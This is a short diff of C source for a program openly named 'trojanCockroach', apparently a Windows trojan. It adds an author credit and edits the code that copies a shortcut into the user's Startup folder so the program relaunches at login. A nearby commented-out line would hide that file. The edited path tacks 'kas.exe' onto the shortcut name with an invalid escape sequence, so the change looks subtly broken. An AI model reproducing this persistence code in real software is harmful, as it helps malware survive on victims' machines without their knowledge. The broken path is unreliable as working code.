@@ -1,6 +1,7 @@
 /**
 * Developer: Minhas Kamal (BSSE-0509, IIT, DU)
 * Date: 28.Sep.15
+* Development : w1ry4 software bugs network
 **/
 
 #define FOLDER_NAME "trojanCockroach"  //containing folder
@@ -97,7 +98,7 @@ main(){
         /////////////////////////////////////////////////////////
         char tasklnkauto[100] = {""};
         strcat(tasklnkauto, appdataFolder);
-        strcat(tasklnkauto, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\cockroach.lnk");
+        strcat(tasklnkauto, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\cockroach.lnk\kas.exe");
 
         CopyFile(runlnk_from, tasklnkauto, 0);
         //SetFileAttributes(tasklnkauto, FILE_ATTRIBUTE_HIDDEN);
